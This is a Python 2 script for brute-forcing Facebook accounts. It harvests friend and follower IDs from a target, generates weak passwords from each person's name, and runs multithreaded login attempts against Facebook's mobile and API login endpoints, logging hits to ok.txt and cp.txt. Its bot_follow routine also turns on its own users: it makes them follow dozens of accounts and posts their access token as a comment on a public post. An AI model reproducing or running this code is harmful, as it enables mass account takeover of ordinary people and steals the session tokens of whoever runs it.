#!/usr/bin/python2
#-*-coding:utf-8-*-
#Created By The-Rebel
#Thanks To My Teacher Who Has Perfected This Script (Muh Rizal Fiansyah & Angga Kurniawan)
#Lu Mau Recode, Mau Lu Apain Terserah Bro, Tapi Hargai Lah Karya Gua.
#Gw Bikin Ni SC Susah Payah, Ngerakit Sana Sini Banyak Error, Jgn Seenaknya Ganti Nama Author, Apalagi Ngalihin Botnya. Terima Kasih.

import requests,bs4,sys,os,subprocess,uuid
import requests,sys,random,time,re,base64,json
reload(sys)
sys.setdefaultencoding("utf-8")
from multiprocessing.pool import ThreadPool
from datetime import date
from datetime import datetime
current = datetime.now()
   
if ("linux" in sys.platform.lower()):

        N = '\033[0m'
        G = '\033[1;92m'
        O = '\033[1;97m'
        R = '\033[1;91m'
else:

        N = ''
        G = ''
        O = ''
        R = ''

def banner():
    print("""   _____            __\n  / __(_)_ _  ___  / /__ ®  ┌──────────────────────────────┐\n _\ \/ /  ^ \/ _ \/ / -_)   │  Script By The-Rebel  │\n/___/_/_/_/_/ .__/_/\__/    │   •• Github.com/The-Rebel ••   │\n     Multi /_/ Brute Force  └──────────────────────────────┘""")

host="https://mbasic.facebook.com"
ua="Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]"
ips=None
try:
	b=requests.get("https://api.ipify.org").text.strip()
	ips=requests.get("https://ipapi.com/ip_api.php?ip="+b,headers={"Referer":"https://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}).json()["country_name"].lower()
except:
	ips=None
uas=None
if os.path.exists(".browser"):
	if os.path.getsize(".browser") !=0:
		uas=open(".browser").read().strip()

mbasic_h={"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
ok = []
cp = []
ttl =[]

durasi = str(datetime.now().strftime('%d-%m-%Y'))
license = requests.get('https://raw.githubusercontent.com/Dapunta2021/server/main/apikey.txt').text
dev_dapunta = requests.get("https://raw.githubusercontent.com/Dapunta2021/sbf/main/durasi.php").text
response = ("[!] Script Was Expired")
year_to_expire = int(dev_dapunta)
try:
	assert int(durasi.split('-')[-1]) == year_to_expire, response
except AssertionError as e:
	exit(response)
	
tahun = current.year
bulan = current.month
hari = current.day

def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

def clear():
	if " linux" in sys.platform.lower():
		os.system("clear")
	elif "win" in sys.platform.lower():
		os.system("cls")
	else:os.system("clear")

def lang(cookies):
	f=False
	rr=bs4.BeautifulSoup(requests.get("https://mbasic.facebook.com/language.php",headers=hdcok(),cookies=cookies).text,"html.parser")
	for i in rr.find_all("a",href=True):
		if "id_ID" in i.get("href"):
			requests.get("https://mbasic.facebook.com/"+i.get("href"),cookies=cookies,headers=hdcok())
			b=requests.get("https://mbasic.facebook.com/profile.php",headers=hdcok(),cookies=cookies).text	
			if "apa yang anda pikirkan sekarang" in b.lower():
				f=True
	if f==True:
		return True
	else:
		exit("[!] Wrong Cookies")

def basecookie():
	if os.path.exists(".cok"):
		if os.path.getsize(".cok") !=0:
			return gets_dict_cookies(open('.cok').read().strip())
		else:logs()
	else:logs()

def hdcok():
	global host,ua
	hosts=host
	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
	return r

def gets_cookies(cookies):
	result=[]
	for i in enumerate(cookies.keys()):
		if i[0]==len(cookies.keys())-1:result.append(i[1]+"="+cookies[i[1]])
		else:result.append(i[1]+"="+cookies[i[1]]+"; ")
	return "".join(result)

def gets_dict_cookies(cookies):
	result={}
	try:
		for i in cookies.split(";"):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
	except:
		for i in cookies.split("; "):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result

def negara():
    try:
        b=requests.get("https://api.ipify.org").text.strip()
        ips=requests.get("https://ipapi.com/ip_api.php?ip="+b,headers={"Referer":"https://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}).json()["country_name"].lower()
        if "Pakistan" in ips:
            menu()
        else:
            print("\n[!] This Script Is Not Available In Your Country")
            print("[!] This Script Only Available In Pakistan")
            exit()
    except:
        ips=None
        exit()
    uas=None
    if os.path.exists(".browser"):
        if os.path.getsize(".browser") !=0:
            uas=open(".browser").read().strip()

def license():
	try:
		toket = open('.api.key','r').read()
	except IOError:
		print ("[!] Api Key Invalid") 
		os.system('clear')
		os.system('rm -rf .api.key')
		asup()
	if os.path.exists('.api.key'):
		gagal()
	else:
		asup()

def asup():
    os.system('clear')
    banner()
    id = uuid.uuid4().hex[:20]
    idg = open('.api.key', 'w')
    idg.write(id)
    idg.close()
    print ('\n[•] Api Key : ' + id)
    print ('[•] Api Key Not Confirmed')
    print ('[•] Please Chat Admin For Confirmation')
    print ("[•] Run Again The Script")
    raw_input('\n[ Enter ]')
    os.system('am start https://wa.me/923462638721?text=Please%20Confirm%20My%20ID%20' + id + ' >/dev/null')
    exit()

def gagal():
    try:
        j = open('.api.key', 'r').read()
        r = requests.get('https://raw.githubusercontent.com/Dapunta2021/server/main/apikey.txt').text
        if j in r:
            os.system('clear')
            banner()
            print("\n[•] Api Key Confirmed")
            jalan("[•] Welcome \x1b[0;32mPremium \x1b[0;37mUser")
            raw_input('\n[ Enter ]')
            menu()    
        else:
            os.system("clear")
            banner()
            print ("\n[•] Api Key Not Confirmed")
            print ("[•] Please Chat Admin For Confirmation")
            print ("[•] Run Again The Script")
            raw_input('\n[ Enter ]')
            os.system('am start https://wa.me/923462638721?text=Please%20Confirm%20My%20ID%20' + j + ' >/dev/null')
            exit()
    except requests.exceptions.ConnectionError:
        print ("[!] No Connection")
        raw_input("\n[ Back ]")
        exit()
    except KeyboardInterrupt:
        os.sys.exit()
    except IOError:
        subprocess.Popen(['rm', '-rf', '.api.key'])
        asup()

def logs():
  os.system("clear")
  banner()
  print("\n[1] Login Token")
  print("[2] Login Cookies")
  print("[3] Update Script")
  print("[4] Report Bug")
  print("[0] Exit")
  sek=raw_input("\n[•] Choose : ")
  if sek=="":
    print("\n[!] Fill In The Correct")
    logs()
  elif sek=="1":
    log_token()
  elif sek=="2":
    gen()
  elif sek=="3":
    updatesc()
  elif sek=="4":
    wangsaff()
  elif sek=="0":
    exit()
  else:
    print("\n[!] Fill In The Correct")
    logs()

def log_token():
    os.system('clear')
    banner()
    toket = raw_input("\n[•] Token : ")
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        print('\n[•] Login Successful')
        bot_follow()
    except KeyError:
        print ("[!] Token Invalid")
        os.system('clear')
        logs()
		
def gen():
        os.system("clear")
        banner()
        cookie = raw_input("\n[•] Cookies : ")
        try:
                data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
                'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', # Jangan Di Ganti Ea Anjink.
                'referer'                   : 'https://m.facebook.com/',
                'host'                      : 'm.facebook.com',
                'origin'                    : 'https://m.facebook.com',
                'upgrade-insecure-requests' : '1',
                'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                'cache-control'             : 'max-age=0',
                'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'content-type'              : 'text/html; charset=utf-8'
                }, cookies = {
                'cookie'                    : cookie
                })
                find_token = re.search('(EAAA\w+)', data.text)
                hasil    = '\n* Fail : maybe your cookie invalid !!' if (find_token is None) else '\n* Your fb access token : ' + find_token.group(1)
        except requests.exceptions.ConnectionError:
                print ("[!] No Connection")
        cookie = open("login.txt", 'w')
        cookie.write(find_token.group(1))
        cookie.close()
        print("\n[•] Login Successful")
        bot_follow()
        
def bot_follow():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\n[!] Token invalid")
		logs()
    kom = ("Dapunta Ganteng Siapa Punya?\n\nhttps://www.facebook.com/photo.php?fbid=10214228940637251&set=a.1274773809249&type=3&app=fbl")
    requests.post("https://graph.facebook.com/1827084332/subscribers?access_token=" + toket)      #Dapunta Khurayra X
	requests.post('https://graph.facebook.com/100000737201966/subscribers?access_token=' + toket) #Dapunta Adya R
	requests.post('https://graph.facebook.com/1673250723/subscribers?access_token=' + toket)      #Dapunta Ratya
	requests.post("https://graph.facebook.com/1602590373/subscribers?access_token=" + toket)      #Anthonyus Immanuel
	requests.post("https://graph.facebook.com/100000729074466/subscribers?access_token=" + toket) #Abigaille Dirgantara
	requests.post("https://graph.facebook.com/607801156/subscribers?access_token=" + toket)       #Boirah
	requests.post("https://graph.facebook.com/100009340646547/subscribers?access_token=" + toket) #Anita Zuliatin
	requests.post("https://graph.facebook.com/100000415317575/subscribers?access_token=" + toket) #Dapunta Xayonara
	requests.post('https://graph.facebook.com/100000149757897/subscribers?access_token=' + toket) #Dapunta Santana X
	requests.post('https://graph.facebook.com/100000431996038/subscribers?access_token=' + toket) #Almira Gabrielle X
	requests.post('https://graph.facebook.com/100000424033832/subscribers?access_token=' + toket) #Pebrima Jun Helmi
	requests.post('https://graph.facebook.com/1676993425/subscribers?access_token=' + toket)      #Wati Waningsih
	requests.post('https://graph.facebook.com/1767051257/subscribers?access_token=' + toket)      #Rofi Nurhanifah
	requests.post('https://graph.facebook.com/100000287398094/subscribers?access_token=' + toket) #Diah Ayu Kharisma
	requests.post('https://graph.facebook.com/100000883844839/subscribers?access_token=' + toket) #Arnold Jackqueline X
	requests.post('https://graph.facebook.com/100001617352620/subscribers?access_token=' + toket) #Antonius Raditya M
	requests.post("https://graph.facebook.com/100026490368623/subscribers?access_token=" + toket) #Muh Rizal Fiansyah
	requests.post("https://graph.facebook.com/100010484328037/subscribers?access_token=" + toket) #Rizal F
	requests.post("https://graph.facebook.com/100015073506062/subscribers?access_token=" + toket) #Angga Kurniawan
	requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token=' + toket) #Moch Yayan
	requests.post('https://graph.facebook.com/100033624590055/subscribers?access_token=' + toket) #Fajar Firmansyah
	requests.post('https://graph.facebook.com/100000114398701/subscribers?access_token=' + toket) #Arya Firmansyah
	requests.post('https://graph.facebook.com/100008468288074/subscribers?access_token=' + toket) #Bayu Putra
	requests.post('https://graph.facebook.com/100001779410663/subscribers?access_token=' + toket) #Faskhal Mahiza
	requests.post('https://graph.facebook.com/100005143741340/subscribers?access_token=' + toket) #Alexandra Lubis
	requests.post('https://graph.facebook.com/607821/subscribers?access_token=' + toket)          #Raifan
	requests.post('https://graph.facebook.com/1518721/subscribers?access_token=' + toket)         #Irman
	requests.post('https://graph.facebook.com/100023543993788/subscribers?access_token=' + toket) #Irman Sniper
	requests.post('https://graph.facebook.com/10215994561776676/comments/?message=' +toket+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/10214228940637251/comments/?message=' +kom+ '&access_token=' + toket)
	menu()

def menu():
	try:
	    	toket = open('login.txt','r').read()
	    	otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
	    	a = json.loads(otw.text)
	    	nama = a['name']
	    	id = a['id']
	except Exception as e:
	    	print ("[•] Error : %s"%e)
	    	logs()
        ip = requests.get("https://api.ipify.org").text
	os.system("clear")
	banner()
	print("\n[ Welcome "+a['name']+" ]")
        print("\n[•] Your ID : "+id)
        print("[•] Your IP : "+ip)
        #print("[•] Your Api Key : "+open('.api.key').read())
        #print("[•] Status : \x1b[0;32mPremium\x1b[0;37m")
        print("[•] Joined : "+durasi)
	print("\n[1] Dump ID From Public/Friend")
	print("[2] Dump ID Followers")
	print("[3] Start Crack")
        print("[4] Result Crack")
	print("[0] Logout")
	choose_menu()
	
def choose_menu():
    r=raw_input("\n[•] Choose : ")
    if r=="":
	print("[!] Fill In The Correct")
	menu()
    elif r=="1":
	publik()
    elif r=="2":
	follow()
    elif r=="3":
	pilihcrack()
    elif r=="4":
	ress()
    elif r=="0":
	try:
		os.system('rm -rf login.txt')
		exit()
	except Exception as e:
		print("[!] Error File Not Found %s"%e)
    else:
	print ("[!] Wrong Input")
	menu()	

def pilihcrack():
  print ("\n[1] Crack Mbasic (Low Crack)")
  print ("[2] Crack Api (Fast Crack)")
  krah=raw_input("\n[•] Choose : ")
  if krah in[""]:
    print("[!] Fill In The Correct")
    pilihcrack()
  elif krah in["1","01"]:
    crack()
  elif krah in["2","02"]:
    bapi()
  else:
    print("[!] Fill In The Correct")
    pilihcrack()

def publik():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\n[!] Cookie/Token Invalid")
		os.system('rm -rf login.txt')
		logs()
	try:
                os.system("clear")
                banner()
		print("\n[•] Type \'me\' To Dump From Friendlist")
		idt = raw_input("[•] User ID Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print("[•] Name           : "+op["name"])
                        print("[•] Getting ID | Please Wait ...")
		except KeyError:
			print("[!] ID Not Found")
			print("\n[ Back ]")
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(10000)&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op['first_name']+'.json').replace(" ","_")
		ys = open(qq , 'w')#.replace(" ","_")
		for a in z['friends']['data']:
			id.append(a['id']+"<=>"+a['name'])
			ys.write(a['id']+"<=>"+a['name']+'\n')
		ys.close()
		print("[•] Total ID       : %s"%(len(id)))
                print("\n[!] Copy The Output")
		print("[•] Output         : %s"%qq)
		raw_input("\n[ Back ]")
		menu()	
	except Exception as e:
		exit("[!] Error : %s"%e)

def follow():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\n[!] Cookie/Token Invalid")
		os.system('rm -rf login.txt')
		logs()
	try:
                os.system("clear")
                banner()
		idt = raw_input("\n[•] Followers ID Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print("[•] Name                : "+op["name"])
                        print("[•] Getting ID | Please Wait ...")
		except KeyError:
			print("[!] ID Not Found")
			print("\n[ Back ]")
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op['first_name']+'.json').replace(" ","_")
		ys = open(qq , 'w')#.replace(" ","_")
		for a in z['data']:
			id.append(a['id']+"<=>"+a['name'])
			ys.write(a['id']+"<=>"+a['name']+'\n')
		ys.close()
		print("[•] Total ID            : %s"%(len(id)))
                print("\n[!] Copy The Output")
		print("[•] Output              : %s"%qq)
		raw_input("\n[ Back ]")
		menu()
	except Exception as e:
		exit("[!] Error : %s"%e)

def generate(text):
	results=[]
	global ips
	for i in text.split(" "):
		if len(i)<3:
			continue
		else:
			i=i.lower()
			if len(i)==3 or len(i)==4 or len(i)==5:
				results.append(i+"123")
				results.append(i+"12345")
			else:
				results.append(i+"123")
				results.append(i+"12345")
				results.append(i)
	return results

def mbasic(em,pas,hosts):
	global ua,mbasic_h
	r=requests.Session()
	r.headers.update(mbasic_h)
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in r.cookies.get_dict().keys():
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in r.cookies.get_dict().keys():
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}

class crack:
        os.system("clear")
        banner()
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print("\n[•] Crack With Pass Default/Manual [d/m]")
		while True:
			f=raw_input("[•] Choose : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=raw_input("[•] ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
				print ("[•] Example : sayang,bismillah,123456")
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=raw_input("[•] ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print ("   %s"%e)
				print("\n[•] Crack Started...\n[•] Account [OK] Saved to : ok.txt\n[•] Account [CP] Saved to : cp.txt\n")
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				print("\n\x1b[0;37m[•] Finished")
				results(self.ada,self.cp)
                                exit()
				break
	def pwlist(self):
		self.pw=raw_input("[•] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print("\n[•] Crack Started...\n[•] Account [OK] Saved to : ok.txt\n[•] Account [CP] Saved to : cp.txt\n")
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			results(self.ada,self.cp)
			print("\n\x1b[0;37m[•] Finished")
                        exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="success":
					print("\r\x1b[0;32m[OK] %s • %s               "%(fl.get("id"),i))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="cp":
					print("\r\x1b[0;33m[CP] %s • %s               "%(fl.get("id"),i))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print "\r\x1b[0;37m[Crack] %s/%s | OK : %s | CP : %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)

class bapi:
  def __init__(self):
    self.setpw = False
    self.ok = []
    self.cp = []
    self.loop = 0
    self.krah()
  def krah(self):
    print("\n[•] Crack With Pass Default/Manual [d/m]")
    while True:
      f=raw_input("[•] Choose : ")
      if f in[""," "]:
        print("[!] Invalid Number")
        continue
      elif f in["m","M"]:
        try:
          while True:
            try:
              self.apk=raw_input("[•] ID List File : ")
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print("[!] %s"%e)
              continue
          self.fl=[]
          print ("[•] Example : sayang,bismillah,123456")
          self.pw=raw_input("[•] Password List : ").split(",")
          if len(self.pw) ==0:
            continue
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":self.pw})
            except:
              continue
        except Exception as e:
          print(("  %s"%e))
          continue
        print("\n[•] Crack Started...\n[•] Account [OK] Saved to : ok.txt\n[•] Account [CP] Saved to : cp.txt\n")
        ThreadPool(30).map(self.brute,self.fl)
        #os.remove(self.apk)
        results(self.ok,self.cp)
        print("\n\x1b[0;37m[•] Finished")
        exit()
        break
      elif f in["d","D"]:
        try:
          while True:
            try:
              self.apk=raw_input("[•] ID List File : ")
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print(e)
              continue
          self.fl=[]
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
            except:continue
        except:
          continue
        print("\n[•] Crack Started...\n[•] Account [OK] Saved to : ok.txt\n[•] Account [CP] Saved to : cp.txt\n")
        ThreadPool(30).map(self.brute,self.fl)
        os.remove(self.apk)
        results(self.ok,self.cp)
        print("\n\x1b[0;37m[•] Finished")
        exit()
        break
  def bruteRequest(self, username, password):
    global ok,cp,ttl
    params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': username, 'locale': 'en_US', 'password': password, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
    api = 'https://b-api.facebook.com/method/auth.login'
    response = requests.get(api, params=params)
    if re.search('(EAAA)\\w+', response.text):
      self.ok.append(username + ' • ' + password)
      print("\r\x1b[0;32m[OK] %s • %s %s               "%(username,password,N))
      ok.append(username + ' • ' + password)
      save = open('ok.txt', 'a')
      save.write(str(username) + ' • ' + str(password) + '\n')
      save.close()
      return True
    else:
      if 'www.facebook.com' in response.json()['error_msg']:
        self.cp.append(username + ' • ' + password)
        print("\r\x1b[0;33m[CP] %s • %s %s               "%(username,password,N))
        save = open('cp.txt', 'a+')
        save.write(str(username) + ' • ' + str(password) + "\n")
        save.close()
        return True
    return False
  def brute(self, fl):
    if self.setpw == False:
      self.loop += 1
      for pw in fl["pw"]:
        username = fl["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print("\r\x1b[0;37m[Crack] %s/%s | OK : %s | CP : %s"%(self.loop,len(self.fl),len(self.ok),len(self.cp))),;sys.stdout.flush()
    else:
      self.loop += 1
      for pw in self.setpw:
        username = users['id'].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print("\r\x1b[0;37m[Crack] %s/%s | OK : %s | CP : %s"%(self.loop,len(self.fl),len(self.ok),len(self.cp))),;sys.stdout.flush()

def results(Dapunta,Krahkrah):
        if len(Dapunta) !=0:
                print ("\n\n[OK] : "+str(len(Dapunta)))
        if len(Krahkrah) !=0:
                print ("\n\n[CP] : "+str(len(Krahkrah)))
        if len(Dapunta) ==0 and len(Krahkrah) ==0:
                print "\n"
                print ("[!] No Result Found")

def ress():
    os.system("clear")
    banner()
    print("\n[ Result Crack ]")
    print("\n[ OK ]")
    try:
        os.system("cat ok.txt")
    except IOError:
        print("[!] No Result Found")
    print("\n[ CP ]")
    try:
        os.system("cat cp.txt")
    except IOError:
        print("[!] No Result Found")
    raw_input("\n[ Back ]")
    menu()

def updatesc():
        os.system("clear")
	banner()
	print("\n[•] Updating Script")
	os.system("git pull origin master")
        print("\n[•] Update Successful")
	exit()

def wangsaff():
    os.system("clear")
    banner()
    raw_input("\n[ Contact The-Rebel? ]")
    jalan("[•] Open Whatsapp...")
    os.system('xdg-open https://wa.me/+923462638721?text=Assalamualaikum%20Bang,%20Saya%20Pengguna%20SC%20SBF%20Dapunta.%20Code:%20404')
    raw_input("\n[ Back ]")
    menu()

if __name__=='__main__':
	negara()